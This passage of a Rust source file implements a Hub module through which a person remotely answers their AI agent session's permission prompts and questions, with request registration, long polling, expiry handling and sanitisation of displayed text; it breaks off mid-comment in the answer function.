//! Answering one permission prompt or question of a waiting session from the Hub, for the person
//! who owns that session's agent token.
//!
//! The session's hook registers the prompt it is showing (the tool, what to show of it, what the
//! person can pick and a salted hash of the tool input, all computed on the machine) and
//! long-polls for an answer. The person's own page lists the requests and answers one: allow,
//! allow with one of the session's own choices, deny, or the answers to a question. A choice and
//! an option travel as positions, and the hook makes its decision from its own copies. The only
//! text of the Hub's that reaches the model is what the person typed: a reason with a deny, or
//! an answer to a question.
//!
//! In memory only, like the waits beside it ([`super::session_waiting`]): bounded, lost on a Hub
//! restart (a hook then reads an unknown request and leaves the prompt to the session), and never
//! written to either store, a log, a notification or a status read. A request is live only while
//! the permission wait it was made for is still the session's current wait, so a prompt answered
//! in the session, or replaced by anything else, ends it.
//!
//! A request whose hook has not polled for a minute (a sleeping or offline computer) is asleep:
//! kept, but neither listed nor answerable, since nobody would hear the answer. It is offered
//! again when that hook polls again, within the same wait and the request's 12 hours.
//!
//! A request starts `unconfirmed` and becomes `pending` only when the Hub also hears the host's
//! `permission_prompt` notification for that session. A host that runs without a person at a
//! dialog (a headless run) raises the permission request but never shows the prompt, so it never
//! sends that notification and is never offered for answering.
use std::collections::BTreeMap;
use std::sync::Mutex;
use std::time::Duration;

use axum::Router;
use axum::extract::rejection::QueryRejection;
use axum::extract::{DefaultBodyLimit, Json, Query, State};
use axum::http::StatusCode;
use axum::routing::{get, post};
use serde::{Deserialize, Serialize};
use serde_json::json;
use tokio::sync::{Notify, Semaphore};
use tokio::time::Instant;

use super::advice::invisible;
use super::coordination_http::not_your_agent;
use super::http::{ApiError, Authenticated, JsonBody, blocking};
use super::login::HumanSession;
use super::session_waiting::{WaitReason, Waiting, holder, wait_key};
use super::store::{AgentToken, Principal, unix_now, validate_repository};
use super::{HubError, HubState};

/// A person may be away for hours; the hook's own bound is a little shorter than this.
const TTL_SECONDS: i64 = 12 * 60 * 60;
/// A request whose hook has not polled for this long is not offered: nobody would hear the
/// answer. It is offered again when that hook polls again (a computer back from sleep, a network
/// that is back), for as long as its wait is still the session's wait.
const HOOK_GONE_SECONDS: i64 = 60;
/// A finished request stays readable so a late answer can say what happened. One that is asleep
/// is kept for as long as it can wake.
const RETAIN_SECONDS: i64 = 120;
/// Requests this Hub holds. A session has one open request, and the waits table bounds a
/// person's waiting sessions, so there is no further bound per person or token. Past this a
/// new request is refused; the ones already waiting stay answerable.
const MAX_LIVE: usize = 1024;
/// Long polls held open at once; past it a poll answers at once.
const MAX_POLLERS: usize = MAX_LIVE;
const MAX_WAIT_SECONDS: u64 = 25;
/// What the host's notification may lead the hook's own request by.
const CONFIRM_SLACK_SECONDS: i64 = 5;
const CONFIRM_KEEP_SECONDS: i64 = 60;
const MAX_CONFIRMATIONS: usize = 1024;
const MAX_SESSION_BYTES: usize = 1024;
const MAX_AGENT_ID_BYTES: usize = 128;
const MAX_TOOL_BYTES: usize = 128;
/// Characters of the display kept; the hook cuts at the same bound.
pub const MAX_DISPLAY_CHARS: usize = 20_000;
/// What the first page written for these requests shows of a display before it cuts it, in the
/// UTF-16 units a browser counts.
const FIRST_PAGE_DISPLAY_UNITS: usize = 4000;
/// Room for a whole display in a registration: its characters may take four bytes each and
/// escape to more in JSON, past the Hub's usual body limit.
const MAX_REGISTER_BYTES: usize = 256 * 1024;
/// Characters kept of a request's one-line summary and of its folder name.
const MAX_LABEL_CHARS: usize = 200;
/// Unshown parts a request may name, and the characters kept of each name.
const MAX_UNSHOWN: usize = 16;
const MAX_UNSHOWN_CHARS: usize = 64;
/// What stands for the missing part of a request from a hook that does not say what is missing.
const UNSTATED_PART: &str = "part of the request (its computer runs an older AgentSCM)";
/// What stands for an unshown part whose own name has nothing a page can show.
const UNREADABLE_NAME: &str = "a part whose name does not show";
/// What one request may offer, and the characters kept of each of its labels; the hook's bounds.
const MAX_CHOICES: usize = 8;
const MAX_QUESTIONS: usize = 4;
const MAX_OPTIONS: usize = 8;
const MAX_OFFER_CHARS: usize = 500;
/// Characters taken of what a person types for their agent: a reason with a deny, or an answer.
const MAX_TYPED_CHARS: usize = 2000;

/// What of a request its person is not shown. They may allow it all the same: the request is
/// their own agent's, and a page says this beside its buttons.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub(super) struct Missing {
    /// Characters the request had before it was cut to the display.
    pub cut_from: Option<u64>,
    /// Secrets the machine replaced in the display.
    pub redacted: u64,
    /// Characters that do not show, which the Hub removed. Counted here, never taken from a hook.
    pub dropped: u64,
    /// Parts of the request the display leaves out, by name.
    pub unshown: Vec<String>,
}

impl Missing {
    /// What a registration says is missing. A hook from before `missing` sends `complete`; only
    /// its `true` means nothing is missing, so a hook that says neither is not taken at its word.
    fn stated(missing: Option<Self>, complete: Option<bool>) -> Self {
        match (missing, complete) {
            (Some(missing), _) => missing,
            (None, Some(true)) => Self::default(),
            (None, _) => Self {
                unshown: vec![UNSTATED_PART.into()],
                ..Self::default()
            },
        }
    }
}

/// One of the host's own suggestions that the person can pick with an allow, as the hook
/// describes it: what it is called, and exactly what it saves and where.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub(super) struct Choice {
    label: String,
    saves: String,
}

/// One question of a question prompt.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub(super) struct Question {
    question: String,
    #[serde(default)]
    header: String,
    options: Vec<QuestionOption>,
    /// Several options may be picked.
    #[serde(default)]
    multiple: bool,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub(super) struct QuestionOption {
    label: String,
    #[serde(default)]
    description: String,
}

/// What a request offers beyond a plain allow or deny. All of it is made on the machine from
/// the host's own hook input; an answer names a choice or an option by its position here.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub(super) struct Offer {
    /// The hook passes on a reason the person types with a deny.
    takes_reason: bool,
    choices: Vec<Choice>,
    /// The questions of a question prompt; empty for a tool.
    questions: Vec<Question>,
}

impl Offer {
    /// The offer with its labels cleaned for the page, or `None` when it holds more than the
    /// bounds allow or a label with nothing to show.
    fn cleaned(self) -> Option<Self> {
        let text = |text: &str| Some(offer_text(text)).filter(|text| !text.is_empty());
        if self.choices.len() > MAX_CHOICES || self.questions.len() > MAX_QUESTIONS {
            return None;
        }
        let choices = self
            .choices
            .iter()
            .map(|choice| {
                Some(Choice {
                    label: text(&choice.label)?,
                    // A choice says exactly what it saves: one that reads differently once
                    // cleaned is not offered, and with it the registration is refused.
                    saves: text(&choice.saves).filter(|clean| *clean == choice.saves)?,
                })
            })
            .collect::<Option<Vec<_>>>()?;
        let questions = self
            .questions
            .iter()
            .map(|question| {
                if !(1..=MAX_OPTIONS).contains(&question.options.len()) {
                    return None;
                }
                let options = question
                    .options
                    .iter()
                    .map(|option| {
                        Some(QuestionOption {
                            label: text(&option.label)?,
                            description: offer_text(&option.description),
                        })
                    })
                    .collect::<Option<Vec<_>>>()?;
                Some(Question {
                    question: text(&question.question)?,
                    header: offer_text(&question.header),
                    options,
                    multiple: question.multiple,
                })
            })
            .collect::<Option<Vec<_>>>()?;
        Some(Self {
            takes_reason: self.takes_reason,
            choices,
            questions,
        })
    }
}

/// One answer to a question: options by their position, or what the person typed.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(super) enum Picked {
    Options(Vec<usize>),
    Text(String),
}

/// What the person sent with a decision: a typed reason with a deny; with an allow one of the
/// request's choices, or the answers to its questions.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub(super) struct With {
    #[serde(skip_serializing_if = "Option::is_none")]
    reason: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    choice: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    answers: Option<Vec<Picked>>,
}

/// A decision and what goes with it.
pub(super) struct Said {
    decision: Decision,
    with: With,
}

impl From<Decision> for Said {
    fn from(decision: Decision) -> Self {
        Self {
            decision,
            with: With::default(),
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Decision {
    Allow,
    Deny,
}

impl Decision {
    fn code(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
        }
    }

    fn parse(code: &str) -> Option<Self> {
        match code {
            "allow" => Some(Self::Allow),
            "deny" => Some(Self::Deny),
            _ => None,
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Ended {
    /// The wait it was made for is gone or replaced: it was answered in the session, or the
    /// session moved on.
    SessionMovedOn,
    Superseded,
    /// Its hook stopped polling. While its wait is still the session's wait the request is only
    /// asleep, and wakes when the hook polls again.
    HookGone,
    Expired,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Phase {
    /// Registered, but the host has not yet said it shows the prompt.
    Unconfirmed,
    Pending,
    Answered(Decision),
    Ended(Ended),
}

// No `Debug`: a row holds the person's tool request.
struct Pending {
    /// The agent token the request's hook polls under.
    token: String,
    native: String,
    asker: Option<String>,
    /// Whose wait the request is for: [`holder`] of the session's wait.
    holder: String,
    owner: String,
    repository_id: Option<i64>,
    item_key: String,
    tool: String,
    summary: Option<String>,
    folder: Option<String>,
    display: String,
    missing: Missing,
    content_hidden: bool,
    input_hash: String,
    created: i64,
    last_poll: i64,
    /// When it was answered or ended.
    settled: i64,
    /// The host said it shows this prompt.
    shown: bool,
    /// The kind of wait it was made for: a permission prompt, or a question.
    kind: WaitReason,
    offer: Offer,
    /// What the person sent with their decision.
    with: With,
    state: Phase,
}

impl Pending {
    fn open(&self) -> bool {
        matches!(self.state, Phase::Unconfirmed | Phase::Pending)
    }

    /// What may go with `decision` for this request, cleaned, or why it does not fit.
    fn fit(&self, decision: Decision, with: With) -> Outcome<With> {
        let bad = |why: &str| Err(Refusal::Invalid(why.to_owned()));
        let questions = &self.offer.questions;
        match (decision, with) {
            (
                Decision::Deny,
                With {
                    reason,
                    choice: None,
                    answers: None,
                },
            ) => {
                let reason = match reason {
                    None => None,
                    Some(_) if !self.offer.takes_reason => {
                        return bad(
                            "this request's computer cannot pass on a reason; deny it without one",
                        );
                    }
                    Some(text) => match typed(&text) {
                        Some(text) => Some(text),
                        None => return bad("reason must be 1 to 2,000 characters"),
                    },
                };
                Ok(With {
                    reason,
                    ..With::default()
                })
            }
            (
                Decision::Allow,
                With {
                    reason: None,
                    choice,
                    answers: None,
                },
            ) if questions.is_empty() => {
                if choice.is_some_and(|choice| choice >= self.offer.choices.len()) {
                    return bad("choice is not one this request offers");
                }
                Ok(With {
                    choice,
                    ..With::default()
                })
            }
            (
                Decision::Allow,
                With {
                    reason: None,
                    choice: None,
                    answers: Some(answers),
                },
            ) if !questions.is_empty() && answers.len() == questions.len() => {
                let answers = answers
                    .into_iter()
                    .zip(questions)
                    .map(|(answer, question)| match answer {
                        Picked::Text(text) => typed(&text).map(Picked::Text),
                        Picked::Options(options) => {
                            let fits = !options.is_empty()
                                && (question.multiple || options.len() == 1)
                                && options.iter().enumerate().all(|(n, option)| {
                                    *option < question.options.len()
                                        && !options[..n].contains(option)
                                });
                            fits.then_some(Picked::Options(options))
                        }
                    })
                    .collect::<Option<Vec<_>>>();
                match answers {
                    Some(answers) => Ok(With {
                        answers: Some(answers),
                        ..With::default()
                    }),
                    None => bad("answers do not fit this request's questions"),
                }
            }
            (Decision::Allow, _) if !questions.is_empty() => {
                bad("a question is answered or denied: send one answer for each question")
            }
            _ => bad("what was sent with the decision does not fit it"),
        }
    }

    /// It ended only because its hook went quiet, and the wait it was made for is still the
    /// session's wait: the hook may come back and be heard.
    fn asleep(&self, waiting: &Waiting, now: i64) -> bool {
        self.state == Phase::Ended(Ended::HookGone)
            && now - self.created < TTL_SECONDS
            && self.attached(waiting, now).is_some()
    }

    /// Its hook is back: a request that was only asleep is offered again. True when the request
    /// is open afterwards.
    fn wake(&mut self, waiting: &Waiting, now: i64) -> bool {
        if self.asleep(waiting, now) {
            self.state = if self.shown {
                Phase::Pending
            } else {
                Phase::Unconfirmed
            };
        }
        if self.open() {
            self.last_poll = now;
        }
        self.open()
    }

    fn end(&mut self, why: Ended, now: i64) {
        self.state = Phase::Ended(why);
        self.settled = now;
    }

    /// The start of the wait this request was made for, while that is still the session's wait.
    fn attached(&self, waiting: &Waiting, now: i64) -> Option<i64> {
        waiting
            .dialog_wait(&self.holder, &self.native, now)
            .filter(|(since, asker, kind)| {
                *since <= self.created && *asker == self.asker && *kind == self.kind
            })
            .map(|(since, ..)| since)
    }
}

#[derive(Default)]
struct Inner {
    rows: BTreeMap<String, Pending>,
    /// When the host last said it shows a permission prompt, per wait holder and session.
    prompts: BTreeMap<(String, String), i64>,
}

impl Inner {
    /// Ends what has expired, lost its hook or lost its wait, and drops what was kept long
    /// enough. A request that is only asleep is kept for its hook's return.
    fn settle(&mut self, waiting: &Waiting, now: i64) {
        for row in self.rows.values_mut().filter(|row| row.open()) {
            if now - row.created >= TTL_SECONDS {
                row.end(Ended::Expired, now);
            } else if now - row.last_poll >= HOOK_GONE_SECONDS {
                row.end(Ended::HookGone, now);
            } else if row.attached(waiting, now).is_none() {
                row.end(Ended::SessionMovedOn, now);
            }
        }
        self.rows.retain(|_, row| {
            row.open() || now - row.settled < RETAIN_SECONDS || row.asleep(waiting, now)
        });
    }
}

/// Why a call was refused; each maps to one HTTP answer.
#[derive(Debug)]
pub(super) enum Refusal {
    Invalid(String),
    /// No current wait of that session at that kind of dialog, asked by that subagent.
    NotWaiting,
    Busy,
    NotFound,
    NotYours,
    AlreadyAnswered,
    AnsweredInSession,
    Ended,
    Hub(HubError),
}

impl From<HubError> for Refusal {
    fn from(error: HubError) -> Self {
        Self::Hub(error)
    }
}

type Outcome<T> = std::result::Result<T, Refusal>;

fn conflict(reason: &str, message: &str) -> ApiError {
    ApiError::new(StatusCode::CONFLICT, "request_conflict")
        .with_message(message)
        .with_field("reason", json!(reason))
}

impl From<Refusal> for ApiError {
    fn from(refusal: Refusal) -> Self {
        match refusal {
            Refusal::Invalid(message) => ApiError::invalid().with_message(message),
            Refusal::NotWaiting => conflict(
                "not_waiting",
                "That session is not waiting at a permission prompt",
            ),
            Refusal::Busy => ApiError::new(StatusCode::TOO_MANY_REQUESTS, "rate_limited")
                .with_message("Too many permission requests are open; try again shortly")
                .with_field("reason", json!("busy")),
            Refusal::NotFound => ApiError::not_found(),
            Refusal::NotYours => not_your_agent(),
            Refusal::AlreadyAnswered => conflict(
                "already_answered",
                "This request was already answered the other way",
            ),
            Refusal::AnsweredInSession => conflict(
                "answered_in_session",
                "The session moved on; it was answered there or the prompt closed.",
            ),
            Refusal::Ended => conflict("ended", "This request is over; its prompt is closed."),
            Refusal::Hub(error) => error.into(),
        }
    }
}

/// What a hook registers: the facts of one prompt, all made on the machine.
pub(super) struct Registration {
    pub session: String,
    pub agent_id: Option<String>,
    pub tool: String,
    /// One line saying what the call does, as the hook worded it.
    pub summary: Option<String>,
    /// The name of the checkout folder the session runs in.
    pub folder: Option<String>,
    pub display: String,
    pub missing: Missing,
    pub content_hidden: bool,
    pub input_hash: String,
}

impl Phase {
    /// What the hook is told: the state name and the decision, never why a request ended.
    fn parts(self) -> (&'static str, Option<&'static str>) {
        match self {
            Self::Unconfirmed => ("unconfirmed", None),
            Self::Pending => ("pending", None),
            Self::Answered(decision) => ("answered", Some(decision.code())),
            Self::Ended(_) => ("ended", None),
        }
    }
}

/// One request as its person's page sees it. Never the hash, token or session.
#[derive(Serialize)]
pub(super) struct Listed {
    item_id: String,
    request_id: String,
    tool: String,
    summary: Option<String>,
    folder: Option<String>,
    display: String,
    /// The Hub accepts an allow for every request it lists. The field tells a page this from a
    /// Hub without it, which refuses an allow unless `complete`.
    allowable: bool,
    /// What the display leaves out; a page says it beside Allow.
    missing: Missing,
    /// Nothing is missing and the display fits what the first page for these requests shows
    /// before it cuts. That page offers Allow only on this.
    complete: bool,
    content_hidden: bool,
    subagent: bool,
    /// A reason typed with a deny reaches the agent.
    deny_reason: bool,
    /// What can go with an allow. An answer names one by its `id`.
    choices: Vec<ListedChoice>,
    /// The questions of a question prompt, each answered by options' positions or typed text;
    /// empty for a tool.
    questions: Vec<Question>,
    since: i64,
    state: &'static str,
    decision: Option<&'static str>,
}

#[derive(Serialize)]
struct ListedChoice {
    id: String,
    label: String,
    saves: String,
}

/// The pending permission requests of this Hub process.
pub struct Requests {
    inner: Mutex<Inner>,
    changed: Notify,
    polls: Semaphore,
}

impl Default for Requests {
    fn default() -> Self {
        Self {
            inner: Mutex::new(Inner::default()),
            changed: Notify::new(),
            polls: Semaphore::new(MAX_POLLERS),
        }
    }
}

/// Third-party text for the person's page: control and invisible characters are dropped, except
/// that line breaks stay (`\r\n` as `\n`) and a tab reads as a space. Cut at
/// [`MAX_DISPLAY_CHARS`]. Also says what the person would not see of what the machine sent: the
/// length before a cut, and how many characters were dropped. A dropped character can carry
/// words that do not show (the Unicode tag block spells ASCII invisibly) while the tool still
/// receives them.
fn sanitize_display(text: &str) -> (String, Option<u64>, u64) {
    let mut dropped = 0;
    let mut kept: String = text
        .replace("\r\n", "\n")
        .chars()
        .filter_map(|c| match c {
            '\n' => Some('\n'),
            '\t' => Some(' '),
            c if c.is_control() || invisible(c) => {
                dropped += 1;
                None
            }
            c => Some(c),
        })
        .collect();
    let chars = kept.chars().count();
    let cut = chars > MAX_DISPLAY_CHARS;
    if cut {
        kept = kept.chars().take(MAX_DISPLAY_CHARS).collect();
    }
    (kept.trim().to_owned(), cut.then_some(chars as u64), dropped)
}

/// A label of an offer for the person's page: one line with nothing that does not show, at most
/// [`MAX_OFFER_CHARS`]. Quotes stay as they are, since a rule is shown exactly.
fn offer_text(text: &str) -> String {
    let (text, ..) = sanitize_display(text);
    let line = text.split_whitespace().collect::<Vec<_>>().join(" ");
    line.chars().take(MAX_OFFER_CHARS).collect()
}

/// What a person typed for their agent: line breaks stay, control and invisible characters go.
/// `None` when nothing is left or it is longer than [`MAX_TYPED_CHARS`].
fn typed(text: &str) -> Option<String> {
    let (text, ..) = sanitize_display(text);
    (!text.is_empty() && text.chars().count() <= MAX_TYPED_CHARS).then_some(text)
}

fn plain_text(value: &str, max: usize) -> bool {
    !value.is_empty() && value.len() <= max && !value.chars().any(char::is_control)
}

impl Requests {
    fn lock(&self) -> Outcome<std::sync::MutexGuard<'_, Inner>> {
        Ok(self.inner.lock().map_err(|_| HubError::Busy)?)
    }

    /// [`Self::register_with`] for a prompt that offers nothing beyond allow and deny.
    #[cfg(test)]
    pub(super) fn register(
        &self,
        waiting: &Waiting,
        principal: &Principal,
        registration: Registration,
        now: i64,
    ) -> Outcome<(String, Phase)> {
        self.register_with(waiting, principal, registration, Offer::default(), now)
    }

    /// Records a prompt the hook is showing. Needs the session's current wait at that kind of
    /// dialog (a question for an offer with questions, a permission prompt otherwise), asked by
    /// the same subagent. A repeat for the same prompt returns the same request; a different
    /// prompt of the session ends the older request.
    pub(super) fn register_with(
        &self,
        waiting: &Waiting,
        principal: &Principal,
        registration: Registration,
        offer: Offer,
        now: i64,
    ) -> Outcome<(String, Phase)> {
        if principal.read_only || now >= principal.expires_at {
            return Err(HubError::Unauthorized.into());
        }
        // The person's page finds requests by repository id; without one nobody could answer.
        if principal.repository_id.is_none() {
            return Err(Refusal::Invalid(
                "this agent token is not bound to a repository".into(),
            ));
        }
        let Registration {
            session,
            agent_id,
            tool,
            summary,
            folder,
            display,
            mut missing,
            content_hidden,
            input_hash,
        } = registration;
        let bad = |what: &str| Refusal::Invalid(format!("{what} is not acceptable"));
        if !plain_text(&session, MAX_SESSION_BYTES) {
            return Err(bad("session"));
        }
        if agent_id
            .as_deref()
            .is_some_and(|id| !plain_text(id, MAX_AGENT_ID_BYTES))
        {
            return Err(bad("agent_id"));
        }
        if tool.is_empty()
            || tool.len() > MAX_TOOL_BYTES
            || !tool
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b':' | b'-'))
        {
            return Err(bad("tool"));
        }
        if input_hash.len() != 64
            || !input_hash
                .bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
        {
            return Err(bad("input_hash"));
        }
        let (display, cut_from, dropped) = sanitize_display(&display);
        if display.is_empty() {
            return Err(bad("display"));
        }
        let offer = offer.cleaned().ok_or_else(|| bad("choices or questions"))?;
        let kind = if offer.questions.is_empty() {
            WaitReason::Permission
        } else {
            WaitReason::Question
        };
        if missing.unshown.len() > MAX_UNSHOWN {
            return Err(bad("missing"));
        }
        // The names are the agent's own words (a tool input's keys): one clean line each. A name
        // with nothing left still stands for a part that is not shown.
        missing.unshown = missing
            .unshown
            .iter()
            .map(|name| super::advice::sanitize(name.trim(), MAX_UNSHOWN_CHARS))
            .map(|name| {
                if name.is_empty() {
                    UNREADABLE_NAME.to_owned()
                } else {
                    name
                }
            })
            .collect();
        missing.cut_from = missing.cut_from.max(cut_from);
        missing.dropped = dropped;
        // Labels beside the display: one clean line each, dropped when nothing is left.
        let label = |text: Option<String>| {
            text.map(|text| super::advice::sanitize(text.trim(), MAX_LABEL_CHARS))
                .filter(|text| !text.is_empty())
        };
        let (summary, folder) = (label(summary), label(folder));
        let mut inner = self.lock()?;
        inner.settle(waiting, now);
        // A request is its session's, like the wait it is for: of a session its host named, it
        // is the person's, whichever of their agent tokens registered it.
        let kept_by = holder(principal, &session);
        match waiting.dialog_wait(kept_by, &session, now) {
            Some((_, asker, waits)) if asker == agent_id && waits == kind => {}
            _ => return Err(Refusal::NotWaiting),
        }
        let session_of = |row: &Pending| row.holder == kept_by && row.native == session;
        // The same prompt offers the same things: the hash covers the tool input, not what the
        // host suggests with it, and an answer names a choice by its position. Registered again
        // under the person's renewed token, it is the same request, which that token now polls.
        for (id, row) in &mut inner.rows {
            if session_of(row)
                && row.repository_id == principal.repository_id
                && row.asker == agent_id
                && row.input_hash == input_hash
                && row.offer == offer
                && row.wake(waiting, now)
            {
                row.token.clone_from(&principal.token_id);
                return Ok((id.clone(), row.state));
            }
        }
        // A session shows one prompt at a time: its other requests are over, also one that is
        // asleep, which must not wake beside this one.
        for row in inner.rows.values_mut().filter(|row| session_of(row)) {
            if row.open() || row.asleep(waiting, now) {
                row.end(Ended::Superseded, now);
            }
        }
        // A request that already waits is never ended to make room for a new one.
        if inner.rows.len() >= MAX_LIVE {
            // Finished rows only wait to answer a late click; they never crowd out a live one.
            inner.rows.retain(|_, row| row.open());
        }
        if inner.rows.len() >= MAX_LIVE {
            return Err(Refusal::Busy);
        }
        let confirmed = inner
            .prompts
            .get(&(kept_by.to_owned(), session.clone()))
            .is_some_and(|at| *at + CONFIRM_SLACK_SECONDS >= now);
        let id = super::login::random_hex()?;
        let state = if confirmed {
            Phase::Pending
        } else {
            Phase::Unconfirmed
        };
        inner.rows.insert(
            id.clone(),
            Pending {
                token: principal.token_id.clone(),
                item_key: wait_key(kept_by, &session),
                holder: kept_by.to_owned(),
                native: session,
                asker: agent_id,
                owner: principal.owner.id.clone(),
                repository_id: principal.repository_id,
                tool,
                summary,
                folder,
                display,
                missing,
                content_hidden,
                input_hash,
                created: now,
                last_poll: now,
                settled: now,
                shown: confirmed,
                kind,
                offer,
                with: With::default(),
                state,
            },
        );
        drop(inner);
        self.changed.notify_waiters();
        Ok((id, state))
    }

    /// The host showed (or is about to show) a permission prompt for `native`: its unconfirmed
    /// request becomes pending, and a request registered within a few seconds after it is
    /// confirmed on arrival. `holder` is [`holder`] of the token that reported it.
    pub(super) fn confirm(&self, holder: &str, native: &str, now: i64) {
        let Ok(mut inner) = self.inner.lock() else {
            return;
        };
        let key = (holder.to_owned(), native.to_owned());
        inner
            .prompts
            .retain(|_, at| now - *at < CONFIRM_KEEP_SECONDS);
        // A full map only stops remembering a prompt that arrives before its request; the
        // requests already waiting are confirmed all the same.
        if inner.prompts.len() < MAX_CONFIRMATIONS || inner.prompts.contains_key(&key) {
            inner.prompts.insert(key, now);
        }
        let mut changed = false;
        for row in inner.rows.values_mut() {
            if row.holder != holder || row.native != native {
                continue;
            }
            if row.state == Phase::Unconfirmed {
                row.state = Phase::Pending;
                changed = true;
            }
            // Also for a request that is asleep, so it wakes as shown.
            if row.open() || row.state == Phase::Ended(Ended::HookGone) {
                row.shown = true;
            }
        }
        drop(inner);
        if changed {
            self.changed.notify_waiters();
        }
    }

    /// The state of a request for the hook that made it; `None` for an unknown id, another
    /// token's request or a different hash, which look alike. The call is that hook being heard:
    /// it keeps an open request live and wakes one that was asleep.
    pub(super) fn check(
        &self,
        waiting: &Waiting,
        token: &str,
        id: &str,
        hash: &str,
        now: i64,
    ) -> Option<Phase> {
        let mut inner = self.inner.lock().ok()?;
        inner.settle(waiting, now);
        let row = inner.rows.get_mut(id)?;
        if row.token != token || row.input_hash != hash {
            return None;
        }
        row.wake(waiting, now);
        Some(row.state)
    }

    /// The hook that made a request calls under another agent token of the same person and
    /// repository: this computer renewed its token while the prompt was up. The request is that
    /// token's from here on. Only the hook holds the request's hash, and only a request kept
    /// under its person moves.
    pub(super) fn follow(&self, caller: &Principal, id: &str, hash: &str, now: i64) {
        if caller.read_only || now >= caller.expires_at {
            return;
        }
        let Ok(mut inner) = self.inner.lock() else {
            return;
        };
        if let Some(row) = inner.rows.get_mut(id)
            && row.holder == caller.owner.id
            && row.repository_id == caller.repository_id
            && row.input_hash == hash
        {
            row.token.clone_from(&caller.token_id);
        }
    }

    /// [`Self::check`], held for up to `wait_seconds` until the state changes. A change wakes
    /// the poll at once; a gone wait is noticed within a second.
    pub(super) async fn poll(
        &self,
        waiting: &Waiting,
        token: &str,
        id: &str,
        hash: &str,
        wait_seconds: u64,
    ) -> Option<Phase> {
        let permit = self.polls.try_acquire().ok();
        let wait = if permit.is_some() { wait_seconds } else { 0 };
        let deadline = Instant::now() + Duration::from_secs(wait);
        let mut first = None;
        loop {
            // Register before reading so a change between read and wait is not missed.
            let notified = self.changed.notified();
            tokio::pin!(notified);
            notified.as_mut().enable();
            let state = self.check(waiting, token, id, hash, unix_now())?;
            let open = matches!(state, Phase::Unconfirmed | Phase::Pending);
            if !open || first.is_some_and(|first| first != state) || Instant::now() >= deadline {
                return Some(state);
            }
            first = Some(state);
            tokio::select! {
                _ = &mut notified => {},
                _ = tokio::time::sleep_until(deadline.min(Instant::now() + Duration::from_secs(1))) => {},
            }
        }
    }

    /// The agent token behind one of `owner`'s requests, for the caller to check it is still
    /// active before answering.
    pub(super) fn token_for(
        &self,
        owner: &str,
        repository_id: Option<i64>,
        id: &str,
    ) -> Outcome<String> {
        let inner = self.lock()?;
        let row = inner.rows.get(id).ok_or(Refusal::NotFound)?;
        if row.owner != owner || row.repository_id != repository_id {
            return Err(Refusal::NotYours);
        }
        Ok(row.token.clone())
    }

    /// The pending and answered requests of `owner` in one repository, oldest first. This is the
    /// list a person answers from, so a request is on it as soon as the host confirms its prompt
    /// is on screen; the wait's first minute holds back only the notice in their status.
    /// Unconfirmed requests are never listed.
    pub(super) fn list(
        &self,
        waiting: &Waiting,
        owner: &str,
        repository_id: Option<i64>,
        now: i64,
    ) -> Outcome<Vec<Listed>> {
        let mut inner = self.lock()?;
        inner.settle(waiting, now);
        let mut out = Vec::new();
        for (id, row) in &inner.rows {
            if row.owner != owner || row.repository_id != repository_id {
                continue;
            }
            let (state, decision) = match row.state {
                Phase::Pending => ("pending", None),
                Phase::Answered(decision) => ("answered", Some(decision.code())),
                Phase::Unconfirmed | Phase::Ended(_) => continue,
            };
            let Some(since) = row.attached(waiting, now) else {
                continue;
            };
            out.push(Listed {
                item_id: format!("waiting:{}:{}", row.kind.code(), row.item_key),
                request_id: id.clone(),
                tool: row.tool.clone(),
                summary: row.summary.clone(),
                folder: row.folder.clone(),
                display: row.display.clone(),
                allowable: true,
                missing: row.missing.clone(),
                complete: row.missing == Missing::default()
                    && row.display.encode_utf16().count() <= FIRST_PAGE_DISPLAY_UNITS,
                content_hidden: row.content_hidden,
                subagent: row.asker.is_some(),
                deny_reason: row.offer.takes_reason,
                choices: row
                    .offer
                    .choices
                    .iter()
                    .enumerate()
                    .map(|(position, choice)| ListedChoice {
                        id: position.to_string(),
                        label: choice.label.clone(),
                        saves: choice.saves.clone(),
                    })
                    .collect(),
                questions: row.offer.questions.clone(),
                since,
                state,
                decision,
            });
        }
        out.sort_by(|a, b| (a.since, &a.request_id).cmp(&(b.since, &b.request_id)));
        Ok(out)
    }

    /// Whether the person can answer the wait with this item key from the Hub now.
    pub(super) fn answerable(&self, waiting: &Waiting, key: &str, now: i64) -> bool {
        let Ok(mut inner) = self.inner.lock() else {
            return false;
        };
        inner.settle(waiting, now);
        inner
            .rows
            .values()
            .any(|row| row.item_key == key && row.state == Phase::Pending)
    }

    /// Records the person's decision for a pending request, with what they sent with it: the
    /// first decision wins, and the same decision again is accepted. A request shown only in
    /// part can be allowed too: it is its person's own agent's, and the list says what is
    /// missing.
    pub(super) fn answer(
        &self,
        waiting: &Waiting,
        owner: &str,
        repository_id: Option<i64>,
        id: &str,
        said: impl Into<Said>,
        now: i64,
    ) -> Outcome<Decision> {
        let Said { decision, with } = said.into();
        let mut inner = self.lock()?;
        inner.settle(waiting, now);
        let row = inner.rows.get_mut(id).ok_or(Refusal::NotFound)?;
        if row.owner != owner || row.repository_id != repository_id {
            return Err(Refusal::NotYours);
        }
        match row.state {
            Phase::Unconfirmed => Err(Refusal::NotFound),
            Phase::Pending => {
                row.with = row.fit(decision, with)?;
                row.state = Phase::Answered(decision);
                row.settled = now;
                drop(inner);
                self.changed.notify_waiters();
                Ok(decision)
            }
            // The same answer again, with the same things sent with it. A different choice,
